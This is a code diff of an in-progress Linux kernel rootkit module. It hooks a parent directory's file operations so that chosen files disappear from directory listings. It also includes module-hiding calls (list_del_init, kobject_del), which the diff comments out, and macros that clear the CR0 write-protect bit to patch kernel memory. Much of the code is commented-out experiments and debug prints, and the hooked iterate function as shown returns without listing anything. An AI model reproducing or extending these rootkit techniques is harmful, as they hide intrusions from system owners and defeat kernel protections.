@@ -151,15 +151,15 @@ struct file_operations fops ={
 /**************************HIDE FILE(OBSOLETE)***************************************/
 
 /*
-struct dentry* g_parent_dentry;
-struct path g_root_path;
-int g_inode_count = 0;
-unsigned long* g_inode_numbers;
+  struct dentry* g_parent_dentry;
+  struct path g_root_path;
+  int g_inode_count = 0;
+  unsigned long* g_inode_numbers;
 
-void** g_old_parent_inode_pointer;
-void** g_old_parent_fop_pointer;
+  void** g_old_parent_inode_pointer;
+  void** g_old_parent_fop_pointer;
 
-filldir_t real_filldir; 
+  filldir_t real_filldir; 
 */
 
 
@@ -190,12 +190,12 @@ filldir_t real_filldir;
 /* } */
 
 /*
-static int new_filldir (void *buf,
-			const char *name,
-			int namelen,
-			loff_t offset,
-			u64 ux64,
-			unsigned ino){
+  static int new_filldir (void *buf,
+  const char *name,
+  int namelen,
+  loff_t offset,
+  u64 ux64,
+  unsigned ino){
   unsigned int i = 0;
   struct dentry* p_dentry;
   struct qstr current_name;
@@ -206,27 +206,27 @@ static int new_filldir (void *buf,
   p_dentry = d_lookup(g_parent_dentry, &current_name);
 
   if (p_dentry!=NULL){
-    for(i = 0; i<= g_inode_count - 1; i++){
-      if (g_inode_numbers[i] == p_dentry->d_inode->i_ino)
-	return 0;
-    }
+  for(i = 0; i<= g_inode_count - 1; i++){
+  if (g_inode_numbers[i] == p_dentry->d_inode->i_ino)
+  return 0;
   }
-}
-static int new_parent_readdir(struct file* file,
-			      void* dirent,
-			      filldir_t filldir){
+  }
+  }
+  static int new_parent_readdir(struct file* file,
+  void* dirent,
+  filldir_t filldir){
   g_parent_dentry = file->f_path.dentry;
   real_filldir = filldir;
   return  0;
-}
+  }
 
 */
 
 /*
-static struct file_operations new_parent_fops =
+  static struct file_operations new_parent_fops =
   {
-   .owner=THIS_MODULE,
-   .readdir=new_parent_readdir,
+  .owner=THIS_MODULE,
+  .readdir=new_parent_readdir,
   };
 */
 /******************************OBSOLETE********************************/
@@ -296,9 +296,8 @@ static struct file_operations new_parent_fops =
 // Runtime var
 struct dentry* g_parent_dentry;
 filldir_t original_filldir;
-
-struct path* g_root_path;
-
+int (*original_iterate)(struct file *, struct dir_context *);
+const struct file_operations *original_parent_fops;
 // List
 struct inode_to_hide {
   unsigned long inode_number;
@@ -312,80 +311,130 @@ LIST_HEAD(inode_to_hide_list);
 static int new_parent_filldir(struct dir_context* context,
 			      const char* name,
 			      int namelen,
-			    loff_t offset,
-			    u64 ino,
-			    unsigned int d_type){
+			      loff_t offset,
+			      u64 ino,
+			      unsigned int d_type){
+  printk(KERN_INFO "New filldir\n");
+  /* struct dentry* p_dentry; */
+  /* struct qstr current_name; */
+  /* struct inode_to_hide* p; */
+  /* current_name.name = name; */
+  /* current_name.len = namelen; */
+  /* current_name.hash = full_name_hash (NULL, name, namelen); */
+  /* p_dentry = d_lookup(g_parent_dentry, &current_name); */
 
-  struct dentry* p_dentry;
-  struct qstr current_name;
-  struct inode_to_hide* p;
-  current_name.name = name;
-  current_name.len = namelen;
-  current_name.hash = full_name_hash (NULL, name, namelen);
-  p_dentry = d_lookup(g_parent_dentry, &current_name);
+  /* /\* if (p_dentry!=NULL){ *\/ */
+  /* /\*   for(i = 0; i<= g_inode_count - 1; i++){ *\/ */
+  /* /\*     if (g_inode_numbers[i] == p_dentry->d_inode->i_ino) *\/ */
+  /* /\* 	return 0; *\/ */
+  /* /\*   } *\/ */
+  /* /\* } *\/ */
 
-  /* if (p_dentry!=NULL){ */
-  /*   for(i = 0; i<= g_inode_count - 1; i++){ */
-  /*     if (g_inode_numbers[i] == p_dentry->d_inode->i_ino) */
+  /* // Search in list */
+  /* if(p_dentry != NULL){ */
+  /*   list_for_each_entry(p, &inode_to_hide_list, list){ */
+  /*     if(p -> inode_number == p_dentry->d_inode-> i_ino ) */
   /* 	return 0; */
   /*   } */
+
   /* } */
-
-  // Search in list
-  if(p_dentry != NULL){
-    list_for_each_entry(p, &inode_to_hide_list, list){
-      if(p -> inode_number == p_dentry->d_inode-> i_ino )
-	return 0;
-    }
-
-  }
   // Return original if not in file list
   return original_filldir(context, name, namelen, offset, ino, d_type);
 }
 
+static int new_parent_iterate(struct file *, struct dir_context *);
+static struct file_operations new_parent_fops = {
+						 .iterate = new_parent_iterate,
+};
+
 static int new_parent_iterate(struct file *file, struct dir_context *context){
-  int ret;
+  printk(KERN_INFO "New iterate!!!!!!!!!\n");
+  int ret = 0;
+  //printk(KERN_INFO "f_op -> iterate: %p\n", file->f_op->iterate);
+  //printk(KERN_INFO "original_iterate: %p\n", original_iterate);
   original_filldir = context->actor;
-  g_parent_dentry = file->f_path.dentry; 
-  *((filldir_t*)&context->actor) = new_parent_filldir;
-  //int ret = g_root_path->dentry->d_inode->i_fop->iterate(file, context);
-  ret = g_parent_dentry->d_inode->i_fop->iterate(file, context);
+  //g_parent_dentry = file->f_path.dentry;
+  //*((filldir_t*)&context->actor) = new_parent_filldir;
+  //ret = g_root_path.dentry->d_inode->i_fop->iterate(file, context);
+  // ret = file->f_path.dentry->d_inode->i_fop->iterate(file, context);
+
+  // Unhook
+  g_parent_dentry->d_inode->i_fop = original_parent_fops;
+  // Original function
+  // ret = original_parent_fops->iterate(file,context);
+  //ret =  g_parent_dentry->d_inode->i_fop->iterate(file,context);
+  // ret = file->f_op->iterate(file,context);
+  // Rehook
+  g_parent_dentry->d_inode->i_fop = &new_parent_fops;
+
+  //ret = file->f_op->iterate(file,context);
+  // ret = original_iterate(file,context);
+  // ret = original_fops->iterate(file,context);
   return ret;
 }
 
-static struct file_operations new_parent_fops = {
-						.iterate = new_parent_iterate,
-};
 	  
+#define DISABLE_W_PROTECTED_MEMORY		\
+  do {						\
+    preempt_disable();				\
+    write_cr0(read_cr0() & (~ 0x10000));	\
+  } while (0);
+#define ENABLE_W_PROTECTED_MEMORY		\
+  do {						\
+    preempt_enable();				\
+    write_cr0(read_cr0() | 0x10000);		\
+  } while (0);
 
 static int hide_file_hook (const char* file_path){
   int error = 0;
+  //struct file* file;
+
   struct path path;
   struct inode_to_hide* inode_entry;
-  /* error = kern_path("/root", LOOKUP_FOLLOW, g_root_path); */
+  /* error = kern_path("/", LOOKUP_FOLLOW, &g_root_path); */
   /* if(error){ */
   /*   printk( KERN_ALERT "Can't access root\n"); */
-  /*   return -1 */
+  /*   return -1; */
   /* } */
-
+  printk(KERN_INFO "hooking fop file: %s\n", file_path);
   error = kern_path(file_path, LOOKUP_FOLLOW, &path);
   if (error){
     printk( KERN_ALERT "Can't access file\n");
     return -1;
   }
-  // Save inode
-  inode_entry = kmalloc(sizeof(struct inode_to_hide), GFP_KERNEL);
-  if(!inode_entry)
-    return -1;
+  /* printk(KERN_INFO "Got inode: %ld", path.dentry->d_inode->i_ino); */
+  /* if ((file = filp_open(file_path, O_RDONLY, 0)) == NULL) { */
+  /*       return -1; */
+  /* } */
   
-  inode_entry->inode_number = path.dentry->d_inode->i_ino;
-  inode_entry->old_parent_fop = path.dentry->d_parent->d_inode->i_fop;
-  inode_entry->parent_inode_pointer = path.dentry->d_parent->d_inode;
+  // Save inode
+  /* inode_entry = kmalloc(sizeof(struct inode_to_hide), GFP_KERNEL); */
+  /* if(!inode_entry) */
+  /*   return -1; */
+  
+  /* inode_entry->inode_number = path.dentry->d_inode->i_ino; */
+  /* inode_entry->old_parent_fop = path.dentry->d_parent->d_inode->i_fop; */
+  /* inode_entry->parent_inode_pointer = path.dentry->d_parent->d_inode; */
 
-  list_add(&inode_entry->list, &inode_to_hide_list);
+  /* list_add(&inode_entry->list, &inode_to_hide_list); */
   
   // Hooking fop of parent
-  path.dentry->d_parent->d_inode->i_fop = &new_parent_fops;
+  //DISABLE_W_PROTECTED_MEMORY
+  //original_iterate = path.dentry->d_parent->d_inode->i_fop->iterate;
+  
+  g_parent_dentry = path.dentry->d_parent;
+
+  original_parent_fops = g_parent_dentry->d_inode->i_fop;
+  g_parent_dentry->d_inode->i_fop = &new_parent_fops;
+
+  //&g_root_path.dentry->d_inode->i_fop = &new_parent_fops;
+  //path.dentry->d_parent->d_inode->i_fop->iterate = &new_parent_iterate;
+  //ENABLE_W_PROTECTED_MEMORY
+  //DISABLE_W_PROTECTED_MEMORY
+  //printk (KERN_INFO "before:%p" ,file->f_op);
+  //file->f_path.dentry->d_parent->d_inode->i_fop = &new_parent_fops;
+  //printk (KERN_INFO "after:%p" ,file->f_op);
+  //ENABLE_W_PROTECTED_MEMORY
   return SUCCESS;
 }
 
@@ -413,17 +462,17 @@ static int __init rootkit_init(void)
 
   ret_val = hide_file_hook(test_path_name);
   if (ret_val < 0){
-    printk(KERN_ALERT "Hook failed ");
+    printk(KERN_ALERT "Hook failed\n");
     return ret_val;
   }
   /*Hide the module*/
-  list_del_init(&__this_module.list);
-  kobject_del(&THIS_MODULE->mkobj.kobj);
+  /* list_del_init(&__this_module.list); */
+  /* kobject_del(&THIS_MODULE->mkobj.kobj); */
  
-  ret_val = register_chrdev(MAJOR_NUM, DEVICE_NAME, &fops);
+  ret_val = register_chrdev(MAJOR_NUM, DEVICE_FILE_NAME, &fops);
   if (ret_val < 0) {
     printk(KERN_ALERT "%s failed with %d\n",
-	   "Sorry, registering the character device ", ret_val);
+	   "Sorry, registering the character device\n ", ret_val);
     return ret_val;
   }
 
@@ -436,8 +485,8 @@ static int __init rootkit_init(void)
 
 static void __exit rootkit_exit(void)
 {
-  backup_hooks();
-  unregister_chrdev(MAJOR_NUM, DEVICE_NAME);
+  // backup_hooks();
+  unregister_chrdev(MAJOR_NUM, DEVICE_FILE_NAME);
   
   printk(KERN_INFO "Rootkit unloaded\n");
  
